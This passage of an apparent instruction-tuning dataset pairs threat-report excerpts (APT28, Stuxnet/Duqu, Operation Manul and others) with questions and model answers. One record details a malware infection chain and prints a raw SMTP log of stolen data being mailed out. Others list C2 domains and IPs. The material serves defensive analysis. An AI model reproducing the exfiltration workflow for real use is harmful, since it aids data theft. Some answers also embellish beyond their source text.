No-IP DDNS, and hosting providers including xTom GmbH and Danilenko, Artyom.\nBig Headline: Conclusion\nTA2541 remains a consistent, active cybercrime threat, especially to entities in its most frequently targeted sectors. Proofpoint assesses with high confidence this threat actor will continue using the same TTPs observed in historic activity with minimal change to its lure themes, delivery, and installation. It is likely TA2541 will continue using AsyncRAT and vjw0rm in future campaigns and will likely use other commodity malware to support its objectives.\nQuestion: Why does TA2541 prefer to use themes related to aviation, transportation, and travel in their phishing campaigns? How does this strategy benefit the threat actor?",
    "output": "Answer: TA2541 prefers to use themes related to aviation, transportation, and travel because these themes align with the industries they target, such as aviation, aerospace, transportation, manufacturing, and defense. By using consistent and relevant themes, the threat actor increases the likelihood that their phishing emails will be opened and interacted with by employees in these sectors. This strategy benefits the threat actor by making their social engineering lures more convincing and effective, thereby increasing the chances of successful compromise.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Stuxnet/Duqu: The Evolution of Drivers\nWe have been studying the Duqu Trojan for two months now, exploring how it emerged, where it was distributed and how it operates. Despite the large volume of data obtained (most of which has yet to be published), we still lack the answer to the fundamental question - who is behind Duqu?\nIn addition, there are other issues, mostly to do with the creation of the Trojan, or rather the platform used to implement Duqu as well as Stuxnet.\nIn terms of architecture, the platform used to create Duqu and Stuxnet is the same. This is a driver file which loads a main module designed as an encrypted library. At the same time, there is a separate configuration file for the whole malicious complex and an encrypted block in the system registry that defines the location of the module being loaded and name of the process for injection.\nConventional platform architecture for Stuxnet and Duqu\nThis platform can be conventionally named as 'Tilded' as its authors are, for some reason, inclined to use file names which start with \"~d\".\nWe believe Duqu and Stuxnet were simultaneous projects supported by the same team of developers.\nSeveral other details have been uncovered which suggest there was possibly at least one further spyware module based on the same platform in 2007-2008, and several other programs whose functionality was unclear between 2008 and 2010.\nThese facts significantly challenge the existing \"official\" history of Stuxnet. We will try to cover them in this publication, but let us first recap the story so far.\nRead the text above and answer this question: How does the architecture of the platform used to create Duqu and Stuxnet facilitate the deployment and operation of these malwares? Why might the authors have chosen this specific design approach?",
    "output": "The architecture of the platform used to create Duqu and Stuxnet consists of a driver file that loads a main module designed as an encrypted library. Additionally, there is a separate configuration file for the entire malicious complex and an encrypted block in the system registry that defines the location of the module being loaded and the name of the process for injection. This design allows for modularity and flexibility, making it easier to update or replace individual components without affecting the entire system. The use of encryption ensures that the malicious payload remains hidden and difficult to detect. The authors may have chosen this specific design approach to enhance the stealth and resilience of the malware, making it harder for security systems to identify and neutralize the threat.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Introduction\nImitation, in this case imitation of a target's infrastructure, is a defining feature of their modus operandi.\nThis threat report gives insight into some of the information that fox-it has about a threat actor that it follows, called Mofang. The name Mofang is based on the Mandarin ng), which means to imitate. Imitation, in this case imitation of a target's (M\u00f3fa \u030c\u6a21\u4effverb infrastructure, is a defining feature of their modus operandi.\nIt is highly likely that the Mofang group is a group that operates out of China and is probably government-affiliated. Among others, one of their focus areas is the government and critical infrastructure sector of Myanmar. Additional information was used to contextualize and explain the observed attacks and campaigns, since there is obviously no easy insight in their actual agenda and goals. The additional research into  geopolitical and economic factors resulted in the hypotheses about the 'why' of these campaigns. The full picture, however, will probably remain unknown.\nfox-it has chosen to release this report now, for additional context to the changing political landscape in Myanmar. This report contains contextual as well as technical information about the group and its activities. These can be used, for example, for threat assessments, compromise assessments, incident response and forensics activities. Should you have any additional information or questions about this group or its activities, please get in touch with fox-it through info@fox-it.com.\nChapter 2 through 6 deals with Mofang, the group, its targets and some of their most notable campaigns and attacks. These chapters also contain geopolitical and economic context. Chapter 7 explains the working of Mofang's preferred tools: ShimRat and SimRatReporter. The final two chapters of this report, chapter 8 and 9, provide technical Indicators of Compromise for use in detecting and hunting, both at a host and at a network level.\n\nHow does the Mofang group leverage imitation in their modus operandi, and what implications might this have for defending against their attacks?",
    "output": "A: The Mofang group, named after the Mandarin word for 'imitate,' uses imitation of a target's infrastructure as a key feature of their operations. This involves mimicking the target's systems and networks to gain unauthorized access and carry out their malicious activities. By imitating the target's infrastructure, Mofang can blend in with legitimate traffic and evade detection mechanisms. This tactic underscores the importance of robust monitoring and anomaly detection systems in cybersecurity defenses. Organizations must ensure they have comprehensive visibility into their network activities and employ advanced techniques to differentiate between legitimate and malicious imitations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: What is Uroburos?\nUroburos is a rootkit, composed of two files, a driver and an encrypted virtual file system. The rootkit is able to take control of an infected machine, execute arbitrary commands and hide system activities. It can steal information (most notably: files) and it is also able to capture network traffic. Its modular structure allows extending it with new features easily, which makes it not only highly sophisticated but also highly flexible and dangerous. Uroburos' driver part is extremely complex and is designed to be very discrete and very difficult to identify.\n\nHow does the modular structure of the Uroburos rootkit contribute to its sophistication and flexibility, and what implications does this have for cybersecurity professionals?",
    "output": "A: The modular structure of the Uroburos rootkit allows it to be extended with new features easily. This modularity contributes to its sophistication by enabling the addition of various functionalities without altering the core components. The flexibility it offers means that attackers can adapt the rootkit to different environments and objectives, making it a versatile tool for cyber espionage and data theft. For cybersecurity professionals, this implies that they need to be vigilant and proactive in monitoring for new variants and capabilities of the rootkit. They must also develop strategies to detect and mitigate not just the known functionalities but also potential future enhancements.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: THE CAUCASUS, PARTICULARLY GEORGIA\nThe Caucasus, a region that includes Chechnya and other Russian republics and the independent states of Georgia, Armenia, and Azerbaijan, continues to experience political unrest. The Georgian government's posture and ties to the West are a frequent source of Moscow's frustration, particularly after the 2008 war.  Overall, issues in the Caucasus likely serve as focal points for Russian intelligence collection efforts.\nSince 2011, APT28 has used lures written in Georgian that are probably intended to target Georgian government agencies or citizens. APT28 is likely seeking information on Georgia's security and diplomatic postures.  Specifically, the group has targeted the Georgian Ministry of Internal Affairs (MIA) and the Ministry of Defense (MOD). We also observed efforts to target a journalist working on issues in the Caucasus and a controversial Chechen news site.\nSmall Headline: APT28 Targeting of the Georgian Ministry of Internal Affairs (MIA)\nThe MIA harbors sensitive information about the inner workings of Georgia's security operations, the country's engagement in multilateral institutions, and the government's communications backbone. It is responsible for3:\n\u2022 Policing, internal security, and border patrols\n\u2022 Counterintelligence\n\u2022 Counterterrorism\n\u2022 International relations\n\u2022 Defense of Georgia's strategic facilities and assets\n\u2022 \"Operative-Technical\" tasks\nAPT28 made at least two specific attempts to target the MIA. In one case, we identified an APT28 lure from mid-2013 that referenced MIA-related topics and employed malware that attempted to disguise its activity as legitimate MIA email traffic. The lure consisted of a weaponized Excel file that presented a decoy document containing a list of Georgian driver's\nlicense numbers. The backdoor attempted to establish a connection to a Georgian MIA mail server and communicate via MIA email addresses ending with \"@mia.ge.gov\". Once connected to the mail server, APT28's backdoor sent an email message using a subject line related to driver's licenses (in Georgian), and attached a file containing system reconnaissance information. This tactic could allow APT28 to obtain data from the MIA's network through a less-monitored route, limiting the MIA network security department's abilities to detect the traffic.\nIn the second example of MIA targeting, an APT28 lure used an information technology-themed decoy document that included references to the Windows domain \"MIA Users\\Ortachala\u2026\" (Figure 1). This probably referred to the MIA facility in the Ortachala district of Tbilisi, Georgia's capital city. The decoy document also contains metadata listing \"MIA\" as the company name and \"Beka Nozadze\"4 as an author, a possible reference to a system administrator in Tbilisi. The text of the document purports to provide domain and user group setup\ninformation for internal Windows XP and Windows 7 systems. APT28 possibly crafted this document to appear legitimate to all MIA system users and intended to breach the MIA network specifically using the embedded malware.\n3 Georgian Ministry of Internal Affairs website http://police.ge/en/home\n4 Queries on the author yielded a LinkedIn page for a person of the same name who serves as a system administrator in Tbilisi.\nSmall Headline: APT28 Targeting of the Georgian Ministry of Defense\nAPT28 also appeared to target Georgia's MOD along with a U.S. defense contractor that was\ntraining the Georgian military.  APT28 used a lure document that installed a SOURFACE downloader (further discussed in the Malware section) and contained a listing of birthdays for members of a working group between the Georgian MOD and the U.S. defense contractor. The U.S. contractor was involved in a working group to advise the MOD and Georgian Armed Forces, assess Georgia's military capabilities, and develop a military training program for the country.\nFigure 1: Georgian MIA-related decoy\nWe wish our cooperation will be both profitable and trusted. Our aim in the Caucasian region is to help people who struggle for their independence, liberty and human rights. We all know, that world is often unfair and cruel, but all together we can make it better.\nSend your articles on this email \u2013 in Russian or English, please. There are some difficulties with Caucasian languages, but we'll solve the problem pretty soon, I hope.\nMedium Headline: Targeting journalists could provide APT28 and its sponsors with a way to monitor public opinion, identify dissidents, spread disinformation, or facilitate further targeting.\nWe believe that APT28's targeting of the MOD aligns with Russian threat perceptions. The growing U.S.-Georgian military relationship has been a source of angst for Russia. Georgia and Russia severed diplomatic relations following the Russia-Georgia War in 2008, and Georgia has since sought to align itself more closely with western security organizations. Additionally, in June 2014, despite Russia's vocal objections, Georgia, along with Ukraine and Moldova, signed association accords with the EU.5  This move placed all three countries more firmly in the EU's political, economic, and security spheres of influence. Georgian military security issues, particularly with regard to U.S. cooperation and NATO, provide a strong incentive for Russian state-sponsored threat actors to steal information that sheds light on these topics.\nAnswer this question: Why did APT28 target the Georgian Ministry of Internal Affairs (MIA), and what specific tactics were used in one of the identified attempts?",
    "output": "APT28 targeted the Georgian Ministry of Internal Affairs (MIA) because it harbors sensitive information about Georgia's security operations, engagement in multilateral institutions, and government communications. In one specific attempt, APT28 used a weaponized Excel file that presented a decoy document containing a list of Georgian driver's license numbers. The backdoor attempted to disguise its activity as legitimate MIA email traffic by communicating via MIA email addresses ending with '@mia.ge.gov'. Once connected to the mail server, APT28's backdoor sent an email message with a subject line related to driver's licenses (in Georgian) and attached a file containing system reconnaissance information. This tactic allowed APT28 to potentially obtain data from the MIA's network through a less-monitored route, limiting the MIA network security department's ability to detect the traffic.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: CHINA IN TRANSITION: XI'S MILITARY AND DOMESTIC REFORMS CENTRALIZE CYBER OPERATIONS\nUnder Xi's leadership, the Chinese military began to implement many long-discussed strategies and concepts for conducting operations in cyberspace. These reforms have sought to centralize and emphasize military and government elements engaged in cyber activity. Combined with Xi's anti-corruption campaign cracking down on the illegitimate use of state resources, these reforms have begun materializing in what we believe is a more refined approach to cyber operations.\nSmall Headline: CHINESE DOMESTIC REFORMS\nChina has undergone significant changes under Xi's leadership, including a massive centralization of presidential power, reforms restructuring the country's military capabilities, and growing regional security concerns.4 Xi's unrivaled authority has allowed him to advance a large-scale reorganization of the People's Liberation Army (PLA). The reforms aim to improve China's ability to conduct joint operations and win \"informationized\"5 wars, deemphasizing the army in favor of a stronger focus on cyber and maritime capabilities and space assets.\nSince 2012, Xi has also actively cracked down on government and military elements using state resources for their own agendas.6\nDECEMBER 2013\nPublication of the Science of Military Strategy describing \"elite, specialized network warfare forces.\"7\nJANUARY 22, 2013\nXi discusses plans to combat corruption, saying, \"We must uphold the fighting of tigers and flies at the same time, resolutely investigating law-breaking cases of leading officials and also earnestly resolving the unhealthy tendencies and corruption problems which happen all around people,\" Xi said in a speech carried by the state news agency Xinhua.8\nFEBRUARY 27, 2014\nXi establishes and heads the Central Internet Security and Informatization Leading Group.9\nJUNE 26, 2014\nXi establishes the PLA Cyberspace Strategic Intelligence Research Center.10\nMAY 2015\nChinese Ministry of National Defense publishes China's Military Strategy, which discusses use of cyber: \"As cyberspace weighs more in military security, China will expedite the development of a cyber force, and enhance its capabilities of cyberspace situation awareness, cyber defense, support for the country's endeavors in cyberspace and participation in international cyber cooperation, so as to stem major cyber crises, ensure national network and information security, and maintain national security and social stability.\"11\nJULY 6, 2015\nDraft cyber security law submitted for comments.12\nDECEMBER 31, 2015\nXi's PLA reorganization elevates cyber operations under the Strategic Support Force, placing cyber operations at the same level as other branches of the military.13\nMARCH 26, 2016\nXi establishes the Cyber Security Association of China.14\nAPRIL 21, 2016\nXi establishes and leads the Joint Force Command to better promote integration of cyber capabilities into military operations.15\nEXPECTED IMPACT ON CYBER OPERATIONS\n\u2022 Greater coordination and fewer disparate government and military elements conducting cyber operations\n\u2022 Deliberate integration of cyber operations with military activity\n\u2022 More disciplined use of state resources to eliminate criminal and unauthorized use of state resources\n4  https://www.foreignaffairs.com/articles/china/2014-10-20/chinas-imperial-president\n5 http://eng.mod.gov.cn/Press/2015-05/26/content_4586805.htm\n6  http://www.globaltimes.cn/content/902639.shtml\n7  http://www.cnas.org/sites/default/files/publications-pdf/CNAS_WarringState_Chang_report_010615.pdf\n8  https://www.theguardian.com/world/2013/jan/22/xi-jinping-tigers-flies-corruption\n9  https://www.washingtonpost.com/world/chinese-president-takes-charge-of-new-cyber-effort/2014/02/27/a4bffaac-9fc9-11e3-b8d8-94577ff66b28_story.html\n10  http://freebeacon.com/national-security/chinese-military-creates-high-level-cyber-intelligence-center/\n11  https://news.usni.org/2015/05/26/document-chinas-military-strategy\n12  http://www.jamestown.org/programs/chinabrief/single/?tx_ttnews%5Btt_news%5D=44924&cHash=db05078399a49339345c2957196d4073\n13  http://blogs.cfr.org/cyber/2016/01/20/chinas-strategic-support-force-the-new-home-of-the-plas-cyber-operations/\n14  http://timesofindia.indiatimes.com/tech/tech-news/China-launches-first-cybersecurity-organisation-Report/articleshow/51561355.cms\n15  http://www.nytimes.com/2016/04/22/world/asia/china-xi-jinping-military-commander.html\nSmall Headline: CHINESE SECURITY CONCERNS\nChina is also facing pressing security concerns within the region, particularly from Taiwan, Japan, and claimants in the South China Sea dispute.  Taiwan's recent election of the pro-independence Democratic People's Party has almost certainly prompted concern in Beijing. Despite the Taiwanese president's pledge to \"maintain the status quo with China,\" Beijing almost certainly views the party's pro-independence mindset as a threat to its territorial sovereignty and future security.  In addition, Japan's increased willingness to defend its regional interests, particularly through expanding the role of its Self-Defense Forces, may allow Japan to balance China more effectively, curbing Beijing's influence and regional ambitions. Lastly, territorial disputes in the South China Sea have intensified over the past few years, due in part to U.S. displays of military power and China's own island-building activities.\nNOVEMBER 23, 2013\nChina establishes an air defense zone near disputed Senkaku/Diaoyu islands in East China Sea.\"17\nDECEMBER 17, 2013\nJapan approves a new security strategy and increases defense spending. China says that it is \"closely watching Japan's security strategy and policy direction. Japan's unreasonable criticism of China's normal maritime activities and its hyping up of the China threat has hidden political motives.\"18\nForeign Ministry spokesman Hong Lei\nMARCH 31, 2014\nThe Philippines asks the UN Permanent Court of Arbitration to determine territorial sovereignty in the South China Sea19 \"It is about defending what is legitimately ours\u2026it is about guaranteeing freedom of navigation for all nations [and will help] preserve regional peace, security, and stability.\"20 Philippine Foreign Secretary Albert del Rosario. The Philippines should \"stop going any further down the wrong track so as to avoid further damage to bilateral relations.\"21\nForeign Ministry spokesperson Hong Lei\nAUGUST 5, 2014\nDuring the ASEAN regional forum, the U.S. and the Philippines suggest a \"freeze\" on island-building in the South China Sea, which China rejects.22\nSEPTEMBER 10, 2014\nWhen describing its island building in the South China Sea \"China's activities on relevant islands and reefs of the Nansha Islands fall entirely within China's sovereignty and are totally justifiable. [Construction is] mainly for the purpose of improving the working and living conditions of people stationed on these islands.\"23\nForeign Ministry spokesperson Hua Chunying\nJANUARY 16, 2016\nTaiwan elections bring the pro-independence Democratic People's Party to Power \"We hope Tsai can lead the DPP out of the hallucinations of Taiwan independence, and contribute to the peaceful and common development between Taiwan and the mainland.\"24\nEditorial published in the Global Times, state-run paper.\n\"There is only one China in the World, the mainland and Taiwan both belong to one China and China's sovereignty and territorial integrity will not brook being broken up. The results of the Taiwan region election does not change this basic fact and the consensus of the international community.\"25\nChinese Foreign Ministry Statement\nEXPECTED IMPACT ON CYBER OPERATIONS\n\u2022 Continued espionage operations in support of China's security interests\n\u2022 Consistent targeting of regional government and military elements\n\u2022 Renewed need for a military focus, likely supported by cyber operations, to boost regional security interests\n16  http://bigstory.ap.org/article/7255da3434534074b870e8264fb7ac9e/pro-china-party-likely-lose-taiwans-election\n17  http://www.bbc.com/news/world-asia-25062525\n18  http://www.bbc.com/news/world-asia-25411653\n19  http://www.bbc.com/news/world-asia-26781682\n20  http://www.bbc.com/news/world-asia-26781682\n21  http://www.bbc.com/news/world-asia-26781682\n22  http://thediplomat.com/2014/08/china-rejects-proposed-freeze-on-provocative-south-china-sea-moves/\n23  http://thediplomat.com/2014/09/why-is-china-building-islands-in-the-south-china-sea/\n24  http://www.reuters.com/article/taiwan-election-idUSKCN0UV02I\n25  http://www.reuters.com/article/taiwan-election-idUSKCN0UV02I\n\nBased on the above text, answer a question. What specific actions did Xi Jinping take to centralize and emphasize cyber operations within the Chinese military and government?",
    "output": "Xi Jinping took several specific actions to centralize and emphasize cyber operations. In December 2013, the publication of the 'Science of Military Strategy' described 'elite, specialized network warfare forces.' In January 2013, Xi discussed plans to combat corruption. In February 2014, he established and headed the Central Internet Security and Informatization Leading Group. In June 2014, he established the PLA Cyberspace Strategic Intelligence Research Center. In May 2015, the Chinese Ministry of National Defense published 'China's Military Strategy,' discussing the use of cyber capabilities. In July 2015, a draft cyber security law was submitted for comments. On December 31, 2015, Xi's PLA reorganization elevated cyber operations under the Strategic Support Force. In March 2016, Xi established the Cyber Security Association of China, and in April 2016, he established and led the Joint Force Command to better promote integration of cyber capabilities into military operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Infection and Data Collection\nWhen opened, the \"slideshow.zip\" file writes and executes several files:\nC:\\Users\\[Username]\\AppData\\Local\\Temp\\IXP000.TMP\\AdobeR1.exe C:\\Users\\ [Username]\\AppData\\Local\\Temp\\IXP000.TMP\\pictures.exe\n\"AdobeR1.exe\" is malicious, while \"pictures.exe\" is the genuine slideshow displayed to the victim. When the slideshow is closed both AdobeR1.exe and pictures.exe are deleted.\nThe AdobeR1 file writes a series of executable files that perform information collection and communication functions, including:\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\AdbrRader.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\AdobeIns.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\GoogleUpate.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\GooglUpd.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\nvidrv.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\nvisdvr.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\rundl132.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\svhosts.exe\nC:\\Users\\[Username]\\Microsoft\\Windows\\Z0xapp8T.tmp\\nvidrv.exe\nMedium Headline: GVKBU\\3AdbrRader.exe:\nDefaultKeyboard\\User\\F124-5KK83-F2IV9-FDN293\\JIPC7-K2ODP-OFnD3-FJCC3\\J1K2F-DKV8J-FKVJI-GVKBU\\2nvidrv.exe:\nDefaultKeyboard\\User\\F124-5KK83-F2IV9-FDN293\\JIPC7-K2ODP-OFnD3-FJCC3\\J1K1F-DKV8J-FKVJI-GVKBU\\1 Sets name \"1\" to StartupInfo structure as a string, e.g. \"0x3110x611\"\nIt then runs GooglUpd, which cleans up the program files if they exist, and runs AdbrRader. AdbrRader (communicating through registry key \"2\") writes the file vgadmysadm.tmp with the name of another registry key \"2\" with startup info.\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\ vgadmysadm.tmp\nNext, nvidrv runs GoogleUpate, which collects system information and writes it to:\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\vg2sxoysinf.tmp\nThen nvidrv runs nvisdvr (registry key \"4\") that collects a list of running processes, which are written to:\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\v2cgplst.tmp\nFinally, nvidrv runs svhosts, which tests Internet connectivity by doing a DNS query for windowsupdate.microsoft.com. It then runs rundl132 if it has not before, by checking whether registry key name \"6\" is present. It sets the key to \"0\" and runs it.\nNext, \"rundl132.exe\" performs an HTTP GET request to myexternalip.com and collects the external IP of the infected machine:\nGET /raw HTTP/1.1\nHost: myexternalip.com\nCache-Control: no-cacheHTTP/1.1 200 OK\nServer: nginx/1.6.2\nContent-Type: text/html; charset=utf-8\nTransfer-Encoding: chunked\nConnection: close\nDate: [REDACTED]\nMy-External-Ip: [REDACTED]f\n[REDACTED]0\nNext, rundl132 writes:\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\Temporary Internet Files\\Content.IE5\\Q7B90TFG\\raw[1].txt\nThen rundl132 writes the external IP to:\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\vgosysaext.tmp\nFinally, rundl132 runs AdobeIns, which zips the contents of the win32.tmp folder.\nProgram \"AdobeIns.exe\" takes the files written by the other programs and zips them in an encrypted, password-protected file:\nC:\\Users\\[Username]\\AppData\\Local\\Microsoft\\Windows\\win32.tmp\\drv.sys\\mxtd\nMedium Headline: SMTP traffic generated by the malware to inbox.com (with redactions)\n220 [REDACTED]ESMTP Postfix\nEHLO [REDACTED]\n250-[REDACTED]\n250-PIPELINING\n250-SIZE 10240000\n250-VRFY\n250-ETRN\n250-ENHANCEDSTATUSCODES\n250-8BITMIME\n250 DSN\nMAIL FROM:< [REDACTED]@inbox.com>\n250 2.1.0 Ok\nRCPT TO:< [REDACTED]@inbox.com>\n250 2.1.5 Ok\nDATA\n354 End data with .\nDate: [REDACTED]\nFrom: <[REDACTED]@inbox.com>\nX-Priority: 3 (Normal)\nTo: <[REDACTED]@inbox.com>\nSubject: repo\nMIME-Version: 1.0\nContent-Type: multipart/mixed; boundary=\"__MESSAGE__ID__[REDACTED]\"\u2013__MESSAGE__ID__[REDACTED] Content-type: text/plain; charset=US-ASCII\nContent-Transfer-Encoding: 7bitHello\n\u2013__MESSAGE__ID__[REDACTED]\nContent-Type: application/x-msdownload; name=\"mxtd\"\nContent-Transfer-Encoding: base64\nContent-Disposition: attachment; filename=\"mxtd\"[REDACTED]\u2013__MESSAGE__ID__[REDACTED]\u2013.\n250 2.0.0 Ok: queued as [REDACTED]\nQUIT\n221 2.0.0 Bye\n\nBased on the above text, answer a question. Describe the process by which the malware collects system information and how it communicates this information externally. What specific files and network requests are involved in this process?",
    "output": "The malware collects system information through a series of executables. First, 'nvidrv.exe' runs 'GoogleUpate.exe', which collects system information and writes it to 'vg2sxoysinf.tmp'. Next, 'nvidrv.exe' runs 'nvisdvr.exe' (registry key '4'), which collects a list of running processes and writes it to 'v2cgplst.tmp'. Then, 'nvidrv.exe' runs 'svhosts.exe', which tests Internet connectivity by performing a DNS query for 'windowsupdate.microsoft.com' and runs 'rundl132.exe' if it hasn't run before. 'rundl132.exe' performs an HTTP GET request to 'myexternalip.com' to collect the external IP of the infected machine and writes it to 'vgosysaext.tmp'. Finally, 'rundl132.exe' runs 'AdobeIns.exe', which zips the contents of the 'win32.tmp' folder into an encrypted, password-protected file 'mxtd'. The collected information is then sent via SMTP to an email address at 'inbox.com', with the subject 'repo' and the attachment 'mxtd' encoded in base64.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Observed Links to the Government of Kazakhstan\nGiven the common thread tying together the targets we find it likely that this campaign was carried out by\u2014or on the behalf of\u2014the government of Kazakhstan, or forces allied with the government. The majority of the targets of the malware campaign are currently embroiled in legal disputes with the government of Kazakhstan in European courts or are the family members or associates of people involved in these disputes. The titles of spearphishing emails often indicate that the targets are being singled out specifically for their interest in matters pertaining to Kazakhstan, such as \"Information KZ,\" \"Press document KZ,\" and \"Kazakh NEWS of importance - Vladimir.\"\nMedium Headline: Observed Links to Arcanum Global Intelligence\nLeaked emails published by Kazaword8 allege that the government of Kazakhstan had previously hired a private intelligence company known as Arcanum to perform a surveillance and data extraction mission (codenamed \"Raptor) targeting Mr. Ablyazov and his family. Among the services offered by Arcanum are \"Full Spectrum Cyber Operations\" which they describe using the following language:\nWhen the need exists, we overlay Full Spectrum Cyber Operations on these core capabilities, our principals' experience, and special technical activities. We do this in order to offer a potent resource to support cyber and information operations planning and execution virtually anywhere in the world.\nWhen our government clients come under threat, Arcanum Global's embedded specialists and capabilities support them with a full suite of response options, including (in consonance with applicable laws and regulations) an array of countermeasures as well as both in-kind and asymmetric responses.\nWe invite you to schedule a comprehensive and completely confidential discussion of your cyber concerns and objectives with our specialists. After\nanalyzing closely your requirements and the physical and cyber environments in which you must operate, Arcanum Global's holistic team of technical, operational and management specialists will recommend specific (and potentially sensitive) solutions \u2013 and then stand beside you to implement them and assure you realize your goals and achieve mission success.\n8 The emails themselves were hosted on Megaupload and have since been taken down as a result of litigation by the government of Kazakhstan, but they have been reported on extensively. You can find an extended discussion of their contents here: .\nEmails published by Kazaword and analyzed by Mediapart allege that Arcanum employed Bernard Squarcini, head of France's domestic intelligence agency, the Direction centrale du renseignement int\u00e9rieur (DCRI) from 2007 to 2012, to inform the Kazakh authorities of the progress of the legal proceedings against Ablyazov and to lobby certain figures in France. Squarcini confirmed to Mediapart that the government of Kazakhstan is a client, but Arcanum spokeswoman Yael Hartmann denied that the company was responsible for the spearphishing attempts, insisting that the company has complied with Swiss law.\nThere is certainly some strong evidence consistent with there being a link between Operation Manul and the government of Kazakhstan and between the government of Kazakhstan and Arcanum. However, we observe no direct links between Operation Manul and Arcanum. The technical evidence discussed below, we believe points instead to an Indian company: Appin.\nMedium Headline: Observed Links To Appin\nWe examined the behavior of the command and control domains used by Operation Manul as they moved from IP to IP. Using Passive Total, we observed that the C2 domains from Operational Manul used a total of 76 IPs from 2008-07-20 to 2016-05-11. We must consider that these domains could have been used by other actors over this time period.\nWhile considering attribution of the actors behind Operation Manul, we investigated the possibility of infrastructure overlap with known actors. Gathering data from existing APT reports9 we automated gathering of historical data from known APT domains from the Passive Total API and comparison with the historical data from Operational Manul domains.\nFrom this we were able to observe overlaps between Operation Manul and an actor known as Appin. Appin is an Indian company that allegedly provides offensive\ncyber-capability on a contract basis. A 2013 report by the cybersecurity firm Norman Shark, titled \"Operation Hangover: Unveiling an Indian Cyberattack Infrastructure\"10 , describes multiple campaigns linked to this actor. The campaigns included attacks on Punjabi separatists,Norwegian telecom Telenor, and multiple other companies.\n9\nAppin is an exceptionally noisy actor, which might be expected given the contract nature of their work. Prior research11 revealed 607 domains related to Appin which we were able to link via historical passive DNS to 1345 IPs. Of these, there were direct overlaps for two of the Operational Manul domains. There were indirect overlaps (same IP, at different times) with 110 of the Operation Hangover domains and all but two of the domains associated with Operation Manul.\nThe domains researchwork.org and dropboxonline.com were both on 64.202.189.170 on 2011-01-14. Additionally, the domains adobeair.net and bikefanclub.info both resided on 50.63.202.94 from 2014-04-24 to 2014-04-25. The researchwork.org and bikefanclub.org domains were attributed to Appin in the Operation Hangover report, while adobeair.net and dropboxonline.com were observed during the investigation of Operation Manul. Additionally there was a near overlap between abobeair[.]net (one of the Operation Manul domains) and appinsecurity[.]com (attributed to Appin in the Operation Hangover report) both hosted at 174.120.120.151 just five days apart in August of 2010.\nWhat's more, according to an appeal filed in a Swiss court on behalf of the Ablyazov family, several of the malware samples sent to Mr. Ablyazov's son-in-law and his attorney and linked with this campaign were variants of the HackBack Trojan. This Trojan is in the same malware family as the Trojan found on an Angolan activist's computer at the Oslo Freedom Forum in 2013\u2014which was also linked to Appin by researchers at ESET and Norman Security12 . We were unable to obtain the samples mentioned in the legal documents at the time of this writing.\nA report written by the Swiss federal police, which investigated the origin of several of the spearphishing emails sent to Ablyazov's family and associates, concluded that the emails were sent from IP addresses in India.\n10\n11http://ver007.com/tools/APTnotes/2013/Unveiling%20an%20Indian%20Cyberattack%20Infrastructure%20-%2 0appendixes.pdf\n12http://www.welivesecurity.com/2013/06/05/operation-hangover-more-links-to-the-oslo-freedom-forum-incid ent/\nWhile there are links to Appin, it's not conclusive that Operation Manul was carried out by this actor. Both 50.63.202.94 and 64.202.189.170 are very busy domains. Passive Total tells us that 50.63.202.94 has hosted 4535 unique domains since 2012, while 64.202.189.10 has hosted 4213 unique domains since 2009. Additionally, while the overlap with Appin exists, the fact that domains used the same IP at the same time is insufficient for concrete attribution. The evidence is consistent with links to Appin, but remains inconclusive. Certainly, the sort of targeting we have seen in Operation Manul appears to be consistent with other efforts targeting activists that have been associated with the same actor.\nFig 9. An illustration of the shared network infrastructure between Operation Manul and Operation Hangover. Domains highlighted in red shared servers with Operation Manul domains at the same time.\nBig Headline: Other Possible Targets\nFig 10. Uploaded password files from other victims\nWhile investigating the C2 servers associated with Operation Manul, we discovered several open directories which contained files presumably related to other operations being run by this same actor (Fig 10). Additionally, we discovered web control panels for several different commodity RATs located under directories that appeared to be code-names for different operations (Fig 11). We also discovered several files which were presumably uploaded from other victims' computers (Fig 12). Lastly, we discovered encrypted data dumps from yet more campaigns, which we were unable at the time of this report.\nWe found many related samples of the Bandook Trojan while we were doing our research. For example, 65af112ce229ad888bf4bbba1e3dba701e0e68c9caf81543bb395a8b8192ba8e contains references to Al Qaeda/ISIS material and the forged document is from an Arabic language pack. This sample however is associated with the same C2 servers used by Operation Manul.\nWe also found several uploaded log files which indicate the presence of an Android RAT. Unfortunately we were to find samples of this RAT at the time of this report.\nThe discoveries that we made while investigating the command and control infrastructure associated with this campaign suggest that these attackers are \"hired guns\" and have multiple operations against different targets going on at the same time.\nFig 11. Web based RAT control panels found on Operation Manul C2 Servers\nFig 12. Uploaded documents from the victim of another campaign found on Operation Manul C2 servers.\nQuestion: Explain the technical evidence linking Operation Manul to Appin, an Indian cybersecurity company. What methods were used to establish this connection?",
